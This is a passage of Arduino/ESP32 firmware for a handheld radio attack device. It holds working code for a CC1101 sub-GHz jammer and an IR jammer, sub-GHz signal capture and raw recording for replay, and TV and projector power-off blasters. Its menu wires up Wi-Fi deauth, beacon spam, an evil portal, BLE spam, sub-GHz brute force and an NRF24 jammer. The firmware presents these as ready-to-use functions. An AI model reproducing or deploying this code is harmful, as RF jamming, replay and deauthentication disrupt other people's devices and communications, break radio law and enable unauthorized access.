      delay(1200);
    }

    u8g2.clearBuffer(); drawStars();
    for (int i = 0; i < 4; i++) {
      int idx = selected + i;
      if (idx >= fileCount) break;
      u8g2.drawStr(0, 24 + i * 10, ((idx == selected ? "> " : "  ") + files[idx]).c_str());
    }
    u8g2.sendBuffer(); delay(30);
  }
}

void runTVUniversal() {
      if (!sdReady) {
        u8g2.clearBuffer(); drawStars(); u8g2.drawStr(10,30,"SD Error"); u8g2.sendBuffer(); delay(1000); return;
    }

    
    while(digitalRead(BTN_OK) == LOW) { delay(10); } 
    delay(200); 


    String files[30];

  int selected = 0;
  const int visibleLines = 4;

  while (digitalRead(BTN_BACK) == HIGH) {
    if (digitalRead(BTN_DOWN) == LOW) {
      selected = (selected + 1) % tvCodesCount;
      delay(150);
    }

    if (digitalRead(BTN_UP) == LOW) {
      selected = (selected - 1 + tvCodesCount) % tvCodesCount;
      delay(150);
    }

    if (digitalRead(BTN_OK) == LOW) {
      delay(200);

      u8g2.clearBuffer();
	  drawStars();
      drawText("Sending...", 16);
      drawText(tvCodes[selected].name, 34);
      u8g2.sendBuffer();

     
      if (tvCodes[selected].bits == 32) {
        irsend.sendNEC((uint64_t)tvCodes[selected].code, 32);
      }
     
      else if (tvCodes[selected].bits == 12) {
        irsend.sendSony(tvCodes[selected].code, 12, 2);
      }

      u8g2.clearBuffer();
	  drawStars();
      drawText("TV OFF SENT", 16);
      drawText(tvCodes[selected].name, 34);
      u8g2.sendBuffer();
      delay(1200);
    }

    int start = 0;
    if (selected >= visibleLines) {
      start = selected - visibleLines + 1;
    }

    u8g2.clearBuffer();
	drawStars();

    char counter[16];
    snprintf(counter, sizeof(counter), "[%d/%d]", selected + 1, tvCodesCount);
    u8g2.drawStr(0, 10, counter);

    for (int i = 0; i < visibleLines; i++) {
      int idx = start + i;
      if (idx >= tvCodesCount) break;

      String name = tvCodes[idx].name;
      if (name.length() > 16) {
        name = name.substring(0, 16);
      }

      char line[24];
      snprintf(line, sizeof(line), "%s %s",
               (idx == selected ? ">" : " "),
               name.c_str());

      u8g2.drawStr(0, 24 + i * 10, line);
    }

    u8g2.sendBuffer();
    delay(30);
  }
}

void runPJUniversal() {
      if (!sdReady) {
        u8g2.clearBuffer(); drawStars(); u8g2.drawStr(10,30,"SD Error"); u8g2.sendBuffer(); delay(1000); return;
    }

    
    while(digitalRead(BTN_OK) == LOW) { delay(10); } 
    delay(200); 
   

    String files[30];

  int selected = 0;
  const int visibleLines = 4;

  while (digitalRead(BTN_BACK) == HIGH) {
    if (digitalRead(BTN_DOWN) == LOW) {
      selected = (selected + 1) % pjCodesCount;
      delay(150);
    }

    if (digitalRead(BTN_UP) == LOW) {
      selected = (selected - 1 + pjCodesCount) % pjCodesCount;
      delay(150);
    }

    if (digitalRead(BTN_OK) == LOW) {
      delay(200);

      u8g2.clearBuffer();
	  drawStars();
      drawText("Sending...", 16);
      drawText(pjCodes[selected].name, 34);
      u8g2.sendBuffer();

      if (pjCodes[selected].bits == 32) {
        irsend.sendNEC((uint64_t)pjCodes[selected].code, 32);
      }

      u8g2.clearBuffer();
	  drawStars();
      drawText("PJ CODE SENT", 16);
      drawText(pjCodes[selected].name, 34);
      u8g2.sendBuffer();
      delay(1200);
    }

    int start = 0;
    if (selected >= visibleLines) {
      start = selected - visibleLines + 1;
    }

    u8g2.clearBuffer();
	drawStars();

    char counter[16];
    snprintf(counter, sizeof(counter), "[%d/%d]", selected + 1, pjCodesCount);
    u8g2.drawStr(0, 10, counter);

    for (int i = 0; i < visibleLines; i++) {
      int idx = start + i;
      if (idx >= pjCodesCount) break;

      String name = pjCodes[idx].name;
      if (name.length() > 16) {
        name = name.substring(0, 16);
      }

      char line[24];
      snprintf(line, sizeof(line), "%s %s",
               (idx == selected ? ">" : " "),
               name.c_str());

      u8g2.drawStr(0, 24 + i * 10, line);
    }

    u8g2.sendBuffer();
    delay(30);
  }
}

void runSubGHzRead() {
  if (!cc1101Ready) {
    while (digitalRead(BTN_BACK) == HIGH) {
      u8g2.clearBuffer();
	  drawStars();
      u8g2.drawFrame(0, 0, 128, 64);
      u8g2.drawStr(18, 28, "CC1101 FAIL");
      u8g2.drawStr(16, 50, "BACK - exit");
      u8g2.sendBuffer();
      delay(30);
    }
    return;
  }

      if (!sdReady) {
        u8g2.clearBuffer(); drawStars(); u8g2.drawStr(10,30,"SD Error"); u8g2.sendBuffer(); delay(1000); return;
    }

    
    while(digitalRead(BTN_OK) == LOW) { delay(10); } 
    delay(200); 
    

    String files[30];


  int freqIndex = 1; 
  unsigned long lastCode = 0;
  int lastProto = 0;
  float lastFreq = subghzFrequencies[freqIndex];
  unsigned long frameCount = 0;

  ELECHOUSE_cc1101.setMHZ(subghzFrequencies[freqIndex]);
  ELECHOUSE_cc1101.SetRx();

  mySwitch.enableReceive(digitalPinToInterrupt(CC1101_GDO0));

  while (digitalRead(BTN_BACK) == HIGH) {
    if (digitalRead(BTN_DOWN) == LOW) {
      freqIndex = (freqIndex + 1) % subghzFreqCount;
      ELECHOUSE_cc1101.setMHZ(subghzFrequencies[freqIndex]);
      ELECHOUSE_cc1101.SetRx();
      delay(200);
    }

    if (digitalRead(BTN_UP) == LOW) {
      freqIndex = (freqIndex - 1 + subghzFreqCount) % subghzFreqCount;
      ELECHOUSE_cc1101.setMHZ(subghzFrequencies[freqIndex]);
      ELECHOUSE_cc1101.SetRx();
      delay(200);
    }

    if (mySwitch.available()) {
      unsigned long value = mySwitch.getReceivedValue();
      if (value != 0) {
        lastCode = value;
        lastProto = mySwitch.getReceivedProtocol();
        lastFreq = subghzFrequencies[freqIndex];
        frameCount++;
      }
      mySwitch.resetAvailable();
    }

    if (digitalRead(BTN_OK) == LOW && lastCode != 0) {
      bool ok = saveSubReadToSD(getProtocolName(lastProto), lastCode, lastFreq);

      u8g2.clearBuffer();
	  drawStars();
      u8g2.drawFrame(0, 0, 128, 64);
      
      u8g2.drawStr(34, 28, ok ? "SAVED" : "SAVE FAIL");
      u8g2.sendBuffer();
      delay(1000);
    }

    u8g2.clearBuffer();
	drawStars();
    u8g2.drawFrame(0, 0, 128, 64);
    

    char freqText[16];
    snprintf(freqText, sizeof(freqText), "%.2f", subghzFrequencies[freqIndex]);
    u8g2.drawStr(6, 12, freqText);

    char framesText[18];
    snprintf(framesText, sizeof(framesText), "F:%lu", frameCount);
    int fw = u8g2.getStrWidth(framesText);
    u8g2.drawStr(128 - fw - 6, 12, framesText);

    if (lastCode != 0) {
      String ptLine = "pt: ";
      ptLine += getProtocolName(lastProto);

      char codeLine[32];
      snprintf(codeLine, sizeof(codeLine), "Code: %lu", lastCode);

      char freqLine[24];
      snprintf(freqLine, sizeof(freqLine), "Freq: %.2f", lastFreq);

      u8g2.drawStr(6, 24, ptLine.c_str());
      u8g2.drawStr(6, 38, codeLine);
      u8g2.drawStr(6, 52, freqLine);
    }

    u8g2.drawStr(6, 62, "read");
    u8g2.drawStr(72, 62, "Save: OK");

    u8g2.sendBuffer();
    delay(30);
  }

  mySwitch.disableReceive();
}



void runSubGHzRaw() {
  if (!cc1101Ready) return;

  
  while(digitalRead(BTN_OK) == LOW) delay(10);
  delay(300);
  // -------------------

  int freqIndex = 1; 
  
  ELECHOUSE_cc1101.setMHZ(subghzFrequencies[freqIndex]);
  ELECHOUSE_cc1101.setModulation(2);
  ELECHOUSE_cc1101.SetRx();
  
  
  pinMode(CC1101_GDO0, INPUT);

  bool isRecording = false;
  rawSampleCount = 0;

  while (digitalRead(BTN_BACK) == HIGH) {
    
    if (rawSampleCount == 0) {
      if (digitalRead(BTN_DOWN) == LOW) {
        freqIndex = (freqIndex + 1) % subghzFreqCount;
        ELECHOUSE_cc1101.setMHZ(subghzFrequencies[freqIndex]);
        ELECHOUSE_cc1101.SetRx();
        delay(200);
      }
      if (digitalRead(BTN_UP) == LOW) {
        freqIndex = (freqIndex - 1 + subghzFreqCount) % subghzFreqCount;
        ELECHOUSE_cc1101.setMHZ(subghzFrequencies[freqIndex]);
        ELECHOUSE_cc1101.SetRx();
        delay(200);
      }
    }


    int rssi = ELECHOUSE_cc1101.getRssi();
    
    if (rawSampleCount == 0 && rssi > -70) {
       
       unsigned long lastTime = micros();
       bool lastState = digitalRead(CC1101_GDO0);
       int idx = 0;
       
       
       unsigned long timeout = millis();
       while(idx < MAX_RAW_SAMPLES && (millis() - timeout < 500)) { // Макс 0.5 сек записи
           bool currentState = digitalRead(CC1101_GDO0);
           if (currentState != lastState) {
               unsigned long now = micros();
               unsigned long duration = now - lastTime;
               
               
               if (lastState == HIGH) rawSamples[idx] = duration;
               else rawSamples[idx] = -duration;
               
               idx++;
               lastState = currentState;
               lastTime = now;
               timeout = millis(); 
           }
       }
       rawSampleCount = idx;
       
    }

    
    if (digitalRead(BTN_OK) == LOW && rawSampleCount > 0) {
      bool ok = saveSubRawToSD(subghzFrequencies[freqIndex]);
      
      u8g2.clearBuffer(); drawStars(); 
      u8g2.drawFrame(0,0,128,64);
      u8g2.drawStr(34, 28, ok ? "SAVED" : "ERROR");
      u8g2.sendBuffer(); 
      
      delay(1000);
      rawSampleCount = 0;
    }
    
    
    if (digitalRead(BTN_OK) == LOW && rawSampleCount == 0) {
        rawSampleCount = 0;
        delay(200);
    }

    
    u8g2.clearBuffer(); drawStars();
    u8g2.drawFrame(0, 0, 128, 64);

    char buf[32];
    snprintf(buf, sizeof(buf), "%.2f MHz", subghzFrequencies[freqIndex]);
    u8g2.drawStr(6, 12, buf);

    if (rawSampleCount > 0) {
        u8g2.drawStr(6, 30, "CAPTURED!");
        snprintf(buf, sizeof(buf), "Samples: %d", rawSampleCount);
        u8g2.drawStr(6, 42, buf);
        u8g2.drawStr(6, 60, "OK to SAVE");
    } else {
        u8g2.drawStr(6, 30, "Listening...");
        snprintf(buf, sizeof(buf), "RSSI: %d", rssi);
        u8g2.drawStr(6, 45, buf);
    }

    u8g2.sendBuffer();
    delay(20);
  }
}


void startJamming(float freq) {
  ELECHOUSE_cc1101.Init();
  ELECHOUSE_cc1101.setModulation(0); 
  ELECHOUSE_cc1101.setMHZ(freq);
  ELECHOUSE_cc1101.setPA(12);
  ELECHOUSE_cc1101.setDeviation(0);
  ELECHOUSE_cc1101.setRxBW(270.0);
  ELECHOUSE_cc1101.SetTx();
  
  ELECHOUSE_cc1101.SpiWriteReg(0x3E, 0xFF); 
  ELECHOUSE_cc1101.SpiWriteReg(0x35, 0x60); 
}

void stopJamming() {
  ELECHOUSE_cc1101.SpiWriteReg(0x35, 0x00); 
  
  ELECHOUSE_cc1101.setSpiPin(CC1101_SCK, CC1101_MISO, CC1101_MOSI, CC1101_CS);
  ELECHOUSE_cc1101.Init();
  ELECHOUSE_cc1101.setMHZ(433.92);
  ELECHOUSE_cc1101.SetRx();
}


void runSubGHzJammer() {
  int freqIndex = 1; 
  bool isJamming = false;

  while(digitalRead(BTN_BACK) == HIGH) {
    
    if (!isJamming) {
      if(digitalRead(BTN_DOWN) == LOW) {
        freqIndex = (freqIndex + 1) % subghzFreqCount;
        delay(200);
      }
      if(digitalRead(BTN_UP) == LOW) {
        freqIndex = (freqIndex - 1 + subghzFreqCount) % subghzFreqCount;
        delay(200);
      }
    }

    
    if(digitalRead(BTN_OK) == LOW) {
      delay(300); 
      isJamming = !isJamming;
      
      if(isJamming) {
        startJamming(subghzFrequencies[freqIndex]);
      } else {
        stopJamming();
      }
    }

    
    u8g2.clearBuffer();
    drawStars();
    u8g2.drawFrame(0, 0, 128, 64);
    
    u8g2.setFont(u8g2_font_9x15_tf);
    u8g2.setCursor(30, 20);
    if(isJamming) u8g2.print("JAMMING!");
    else u8g2.print("JAMMER");
    
    u8g2.setFont(u8g2_font_6x12_tf);
    
    char buf[32];
    snprintf(buf, sizeof(buf), "Freq: %.2f MHz", subghzFrequencies[freqIndex]);
    u8g2.drawStr(10, 40, buf);
    
    if(isJamming) u8g2.drawStr(20, 58, "OK to STOP");
    else u8g2.drawStr(20, 58, "OK to START");

    u8g2.sendBuffer();
    delay(50);
  }

  
  if(isJamming) {
    stopJamming();
  }
}

void runIRJammer() {
  
  while(digitalRead(BTN_OK) == LOW) delay(10);
  delay(200);
  // ----------------------------------------

  int freq = 38; 
  

  uint16_t rawJam[68]; 
  for(int i=0; i<68; i+=2) {
      rawJam[i]   = 2000; 
      rawJam[i+1] = 50;   
  }

  while (digitalRead(BTN_BACK) == HIGH) {
    
    if (digitalRead(BTN_UP) == LOW) {
      freq++;
      if (freq > 56) freq = 56; 
      delay(100);
    }
    if (digitalRead(BTN_DOWN) == LOW) {
      freq--;
      if (freq < 30) freq = 30; 
      delay(100);
    }

    
    u8g2.clearBuffer();
    drawStars();
    
    
    u8g2.setFont(u8g2_font_6x12_tf);
    u8g2.setCursor(30, 10);
    u8g2.print("Freq: ");
    u8g2.print(freq);
    u8g2.print(" kHz");

    
    u8g2.setFont(u8g2_font_9x15_tf); 
    u8g2.drawStr(12, 35, "JAMMER");
    u8g2.drawStr(25, 55, "ACTIVE!");
    
    
    if ((millis() / 100) % 2 == 0) {
      u8g2.drawDisc(115, 10, 4);
    }

    u8g2.sendBuffer();


    irsend.sendRaw(rawJam, 68, freq);
    

  }
  

  irsend.enableIROut(38);
}



void drawMenu(const char* title, const char* items[], int size, int selected) {
  const int visibleLines = 4; 
  const int startY = 15;      
  const int lineH = 12;       


  int startIdx = 0;
  if (selected >= visibleLines) {
    startIdx = selected - visibleLines + 1;
  }


  int relativeCursor = selected - startIdx;
  int targetY = startY + relativeCursor * lineH - 10;

  if (animatedY < targetY) animatedY += 2;
  else if (animatedY > targetY) animatedY -= 2;

  u8g2.clearBuffer();
  drawStars();


  u8g2.drawFrame(0, 0, 128, 64);
  

  u8g2.drawRFrame(3, animatedY, 122, 12, 2);


  int sbH = 64 / size; 
  if (sbH < 5) sbH = 5;
  int sbY = (64 * selected) / size;
  u8g2.drawBox(126, sbY, 2, sbH);


  for (int i = 0; i < visibleLines; i++) {
    int itemIndex = startIdx + i;
    

    if (itemIndex >= size) break;

    int y = startY + i * lineH;
    u8g2.drawStr(8, y, items[itemIndex]);
  }

  u8g2.sendBuffer();
}

void showBootLogo() {
  u8g2.clearBuffer();
  drawStars();
  u8g2.setFont(u8g2_font_10x20_tf);
  u8g2.drawStr(6, 35, "havy tech");
  u8g2.sendBuffer();
  delay(2000);

  u8g2.setFont(u8g2_font_6x12_tf);
}

void showInitStatus() {
  while (!sdReady || !cc1101Ready) {
    u8g2.clearBuffer();
    drawStars();
    u8g2.drawFrame(0, 0, 128, 64);

    int y = 14;

    if (!sdReady) {
      u8g2.drawStr(6, y, "error:");
      y += 14;
      u8g2.drawStr(6, y, "sd failed");
      y += 18;
    }

    if (!cc1101Ready) {
      u8g2.drawStr(6, y, "error:");
      y += 14;
      u8g2.drawStr(6, y, "cc1101 failed");
      y += 18;
    }

    u8g2.drawStr(6, 52, "BACK retry");
    u8g2.drawStr(6, 62, "OK continue");
    u8g2.sendBuffer();

    if (digitalRead(BTN_BACK) == LOW) {
      delay(200);

      if (!sdReady) {
        retrySDInit();
      }


      if (!cc1101Ready) {
        ELECHOUSE_cc1101.Init();
        cc1101Ready = ELECHOUSE_cc1101.getCC1101();
        if (cc1101Ready) {
          ELECHOUSE_cc1101.setMHZ(433.92);
          ELECHOUSE_cc1101.SetRx();
        }
      }
    }

    if (digitalRead(BTN_OK) == LOW) {
      delay(200);
      break;
    }

    delay(50);
  }
}

void initModules() {

  pinMode(SD_MISO, INPUT_PULLUP);


  sdSPI.begin(SD_SCK, SD_MISO, SD_MOSI, SD_CS);
  delay(100);


  if (!SD.begin(SD_CS, sdSPI, 4000000)) {
    Serial.println("SD: 4MHz failed. Trying 1MHz...");
    delay(50);
    

    if (!SD.begin(SD_CS, sdSPI, 1000000)) {
      Serial.println("SD: 1MHz failed too.");
      sdReady = false;
    } else {
      Serial.println("SD: OK at 1MHz");
      sdReady = true;
    }
  } else {
    Serial.println("SD: OK at 4MHz");
    sdReady = true;
  }


  if (sdReady) delay(50); 
  
  ELECHOUSE_cc1101.setSpiPin(CC1101_SCK, CC1101_MISO, CC1101_MOSI, CC1101_CS);
  ELECHOUSE_cc1101.Init();
  cc1101Ready = ELECHOUSE_cc1101.getCC1101();

  if (cc1101Ready) {
    ELECHOUSE_cc1101.setMHZ(433.92);
    ELECHOUSE_cc1101.SetRx();
  }
}


void setup() {

  pinMode(SD_CS, OUTPUT);
  digitalWrite(SD_CS, HIGH); 
  
  pinMode(CC1101_CS, OUTPUT);
  digitalWrite(CC1101_CS, HIGH); 
  
  pinMode(NRF24_CSN, OUTPUT);
  digitalWrite(NRF24_CSN, HIGH); 

  Wire.begin(OLED_SDA, OLED_SCL);

  u8g2.begin();
  u8g2.setFont(u8g2_font_6x12_tf);

  pinMode(BTN_UP, INPUT_PULLUP);
  pinMode(BTN_DOWN, INPUT_PULLUP);
  pinMode(BTN_OK, INPUT_PULLUP);
  pinMode(BTN_BACK, INPUT_PULLUP);

  pinMode(CC1101_GDO0, INPUT);

  Serial.begin(115200);

  irsend.begin();
  pinMode(CC1101_GDO0, INPUT);
  randomSeed(micros());
  initStars();
  animatedY = 5;

  showBootLogo();
  initModules();
  showInitStatus();
}

void loop() {
  const char** currentList = nullptr;
  int maxItems = 0;
  const char* title = "";

  if (currentState == MAIN_MENU) {
    currentList = mainItems;
    maxItems = 5;
    title = "MAIN";
  }
  else if (currentState == WIFI_MENU) {
    currentList = wifiItems;
    maxItems = 5;
    title = "WIFI";
  }
  else if (currentState == BLE_MENU) {
    currentList = bleItems;
    maxItems = 3;
    title = "BLE";
  }
  else if (currentState == IR_MENU) {
    currentList = irItems;
    maxItems = 5;
    title = "IR";
  }
  else if (currentState == SUBGHZ_MENU) {
    currentList = subghzItems;
    maxItems = 6;
    title = "SUBGHZ";
  }
    else if (currentState == NRF_MENU) {
    currentList = nrfItems;
    maxItems = 2;
    title = "NRF24";
  }
  else {
    currentState = MAIN_MENU;
    cursor = 0;
    return;
  }

  if (currentList != nullptr) {
    drawMenu(title, currentList, maxItems, cursor);
  } else {
    u8g2.clearBuffer();
	drawStars();
    u8g2.drawFrame(0, 0, 128, 64);
    u8g2.drawStr(20, 26, "Not implemented");
    u8g2.drawStr(24, 46, "BACK - exit");
    u8g2.sendBuffer();
  }

  if (maxItems > 0) {
    if (isPressed(BTN_DOWN, lastDownState)) {
      cursor = (cursor + 1) % maxItems;
    }

    if (isPressed(BTN_UP, lastUpState)) {
      cursor = (cursor - 1 + maxItems) % maxItems;
    }
  }

  if (isPressed(BTN_BACK, lastBackState)) {
    currentState = MAIN_MENU;
    cursor = 0;
  }

  if (isPressed(BTN_OK, lastOkState)) {
    if (currentState == MAIN_MENU) {
      if (cursor == 0) currentState = WIFI_MENU;
      else if (cursor == 1) currentState = BLE_MENU;
      else if (cursor == 2) currentState = SUBGHZ_MENU;
      else if (cursor == 3) currentState = IR_MENU;
      else if (cursor == 4) currentState = NRF_MENU; 
      cursor = 0;
    }
    else if (currentState == WIFI_MENU) {
      if (cursor == 0) runDeauth();
      else if (cursor == 1) runWiFiScan();
      else if (cursor == 2) runBeaconSpam();
      else if (cursor == 3) runWiFiPacket();
      else if (cursor == 4) runEvilPortal();
    }
    else if (currentState == BLE_MENU) {
      if (cursor == 0) runBLEIosSpam();
      else if (cursor == 1) runBLEAndrSpam();
      else if (cursor == 2) runBLEWindSpam();
    }
    else if (currentState == IR_MENU) {
      if (cursor == 0) runIRReceiver();
      else if (cursor == 1) runIRSend();
      else if (cursor == 2) runTVUniversal();
      else if (cursor == 3) runPJUniversal();
      else if (cursor == 4) runIRJammer();
    }
    else if (currentState == SUBGHZ_MENU) {
      if (cursor == 0) runSubGHzRead();
      else if (cursor == 1) runSubGHzRaw();
      else if (cursor == 2) runSubGHzSendFile(); 
      else if (cursor == 3) runSubGHzAnalyzer(); 
      else if (cursor == 4) runSubGHzBruteMenu(); 
      else if (cursor == 5) runSubGHzJammer(); 
    }
    else if (currentState == NRF_MENU) {
      if (cursor == 0) runNRF24Spectrum();
      else if (cursor == 1) runNRF24JammerMenu();
    }
  }

  delay(15);
}